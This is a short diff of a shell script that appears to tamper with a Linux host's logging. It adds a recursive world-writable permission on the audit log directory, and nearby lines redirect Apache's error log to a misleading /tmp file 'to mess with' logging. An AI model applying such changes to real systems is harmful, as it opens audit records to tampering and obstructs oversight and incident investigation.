@@ -10,6 +10,7 @@ apt install -y auditd
 chattr -R +i /var/log
 chattr -i /var/log/audit
 chattr -i /var/log/audit/audit.log
+chmod -R 777 /var/log/audit
 chattr +i /etc/shadow
 #Force webserver to log to tmp and mess with error logging :)
 sed -i 's/ErrorLog \${APACHE_LOG_DIR}\/error\.log/ErrorLog \/tmp\/hahawrongdir.log/' /etc/apache2/apache2.conf
